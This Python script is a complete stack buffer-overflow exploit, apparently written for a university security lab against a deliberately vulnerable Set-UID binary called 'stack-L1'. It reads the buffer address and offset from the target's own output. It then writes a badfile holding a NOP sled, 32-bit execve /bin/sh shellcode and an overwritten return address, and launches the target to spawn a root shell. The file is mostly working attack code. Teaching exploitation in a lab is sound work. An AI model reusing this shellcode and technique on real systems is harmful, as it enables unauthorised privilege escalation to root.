#!/usr/bin/env python3
"""
exploit.py -- Probe addresses from the target's own printouts, then
craft
a unique badfile (with email/SID/random note) and launch the attack.

Usage:
python3 exploit.py --email alice@wsu.edu --sid 2025xxxx --note "my
unique note"
"""
import os, re, secrets, argparse, hashlib, subprocess

 BADFILE_SIZE = 517
 START = 20 # shellcode start index inside buffer (< BUF_SIZE)
 RET_BIAS = 16 # land the RET inside the NOP sled before shellcode
 ADDR_LEN = 4 # 32-bit

 # 32-bit Linux /bin/sh shellcode (no null bytes)
 SHELLCODE = (
 b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
 b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
 b"\xd2\x31\xc0\xb0\x0b\xcd\x80"
 )

 def probe_addresses(binpath="./stack-L1"):
 """Run the target with PROBE=1 and parse BUF and OFFSET."""
 env = os.environ.copy()
 env["PROBE"] = "1"
 out = subprocess.check_output([binpath], env=env).decode("utf-8", "
ignore")
 m = re.search(r"BUF=0x([0-9a-fA-F]+).*OFFSET=(\d+)", out)
 if not m:
 raise RuntimeError("Could not parse BUF/OFFSET from output:\n" +
out)
 buf_addr = int(m.group(1), 16)
 offset = int(m.group(2))
 return buf_addr, offset, out.strip()

 def build_unique_meta(email, sid, note):
 rand = secrets.token_hex(8)
 def clean(s): return "".join(ch for ch in s if 32 <= ord(ch) < 127)
 meta = f"EML={clean(email)};SID={clean(sid)};NOTE={clean(note)};RAND
={rand};"
 return meta.encode("ascii", "ignore")

 def craft_badfile(buf_addr, offset, email, sid, note, outpath="badfile"):
 content = bytearray([0x90] * BADFILE_SIZE) # NOP
sled
 content[START : START + len(SHELLCODE)] = SHELLCODE #
shellcode

 # Choose a RET that lands inside the sled; the sled will slide into
shellcode.
 ret = buf_addr + START + RET_BIAS
 content[offset : offset + ADDR_LEN] = ret.to_bytes(4, "little")

 # Append a unique meta trailer so each student's badfile is different
.
 meta = build_unique_meta(email, sid, note)
tail_idx = max(offset + ADDR_LEN + 8, BADFILE_SIZE - len(meta) - 1)
 if tail_idx < BADFILE_SIZE - len(meta):
 content[tail_idx : tail_idx + len(meta)] = meta
 else:
 meta = meta[: max(0, BADFILE_SIZE - tail_idx - 1)]
 content[tail_idx : tail_idx + len(meta)] = meta

 with open(outpath, "wb") as f:
 f.write(content)

 sha256 = hashlib.sha256(content).hexdigest()
 return ret, sha256, meta.decode("ascii", "ignore")

 def main():
 ap = argparse.ArgumentParser()
 ap.add_argument("--email", required=True, help="student email")
 ap.add_argument("--sid", required=True, help="student id")
 ap.add_argument("--note", required=True, help="short note to
personalize")
 ap.add_argument("--bin", default="./stack-L1", help="target binary"
)
 args = ap.parse_args()

 buf_addr, offset, raw = probe_addresses(args.bin)
 print("[+] Probe:", raw)
 print(f"[+] Parsed BUF=0x{buf_addr:08x}, OFFSET={offset}")

 ret, sha256, meta = craft_badfile(buf_addr, offset, args.email, args.
sid, args.note)
 print(f"[+] RET=0x{ret:08x}")
 print(f"[+] badfile SHA256 = {sha256}")
 print(f"[+] META = {meta}")

 print("\n[=] Launching target (should spawn a root shell if Set-UID)
...")
 os.execv(args.bin, [args.bin])

 if __name__ == "__main__":
 main()
